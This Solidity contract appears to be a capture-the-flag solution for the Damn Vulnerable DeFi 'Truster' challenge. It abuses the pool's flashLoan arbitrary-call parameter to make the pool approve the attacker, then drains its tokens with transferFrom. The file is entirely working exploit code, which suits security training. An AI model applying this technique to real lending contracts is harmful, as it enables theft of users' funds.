// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract AttackLender {
    using Address for address;

    IERC20 public immutable damnValuableToken;
    ITrusterLenderPool public immutable truster;

    constructor(address tokenAddress, address trusterAddress) {
        damnValuableToken = IERC20(tokenAddress);
        truster = ITrusterLenderPool(trusterAddress);
    }

    function attack(uint256 borrowAmount) external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            borrowAmount
        );

        // we put malicious call inside flashLoan target and data, approve this attacker contract spending DVT on behalf of truster contract
        truster.flashLoan(
            borrowAmount,
            address(truster),
            address(damnValuableToken),
            data
        );

        // then we spend the DVT
        damnValuableToken.transferFrom(
            address(truster),
            msg.sender,
            borrowAmount
        );
    }
}
